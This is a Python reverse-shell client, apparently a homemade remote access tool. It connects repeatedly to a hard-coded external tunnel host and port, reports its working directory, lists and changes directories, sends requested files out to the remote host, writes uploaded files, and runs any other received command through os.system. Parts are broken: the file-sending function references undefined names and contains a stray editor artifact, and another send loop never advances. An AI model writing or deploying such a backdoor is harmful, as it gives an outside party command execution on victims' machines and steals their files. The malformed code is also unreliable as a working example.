import socket
import os
import time
import struct


host = 'coookiesamcream32-63591.portmap.host'
port = 63591


def enviar(filename):
     while True:
        file = open(filename , "rb")
        contenido = read(1024)
        while contenido:
             s.send(contenido)
             contenido = f.read(1024)
       s.send("a".encode("UTF-8")) :q
    

def receive_file_size(sck: socket.socket):
        fmt = "<Q"
        expected_bytes = struct.calcsize(fmt)
        received_bytes = 0
        stream = bytes()
        while received_bytes < expected_bytes:
            chunk = sck.recv(expected_bytes - received_bytes)
            stream += chunk
            received_bytes += len(chunk)
        filesize = struct.unpack(fmt, stream)[0]
        return filesize

def receive_file(sck: socket.socket, filename):
        filesize = receive_file_size(sck)
        with open(filename, "wb") as f:
            received_bytes = 0
            while received_bytes < filesize:
                chunk = sck.recv(1024)
                if chunk:
                     f.write(chunk)
                     received_bytes += len(chunk)



def send_file(s, filename):
    filesize = os.path.getsize(filename)
    s.send(struct.pack("<Q", filesize))
    with open(filename, "rb") as f:
        read_bytes = f.read(4096)
        while read_bytes :
            s.send(read_bytes)
while True:
 while True:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
   try:
    s.connect((host, port))
   except (ConnectionRefusedError, TimeoutError):
    time.sleep(40)
    break

   ruta=os.getcwd()
   s.send(ruta.encode("UTF-8"))

   while True:
    try:
     orden = s.recv(1024).decode("UTF-8")
     print(orden)
     if orden == "ls":
        ls=str(os.listdir())
        s.send(ls.encode("UTF-8"))
     elif orden.split(" ")[0] == "cd":
        try:
          os.chdir(orden.split(" ")[1]) 
        except FileNotFoundError:
            pass
     elif orden.split(" ")[0] == "download":
        enviar(orden.split(" ")[1])
     elif orden.split(" ")[0] == "upload":
        receive_file(s,orden.split(" ")[2])
     elif orden == "exit":
        s.close()
        break
     else:
         os.system(orden)
         time.sleep(10)



     time.sleep(0.5)
     ruta=os.getcwd()
     print("ruta")
     s.send(ruta.encode("UTF-8"))
    except (BrokenPipeError,FileNotFoundError ):
       s.close()
       time.sleep(5)
       break
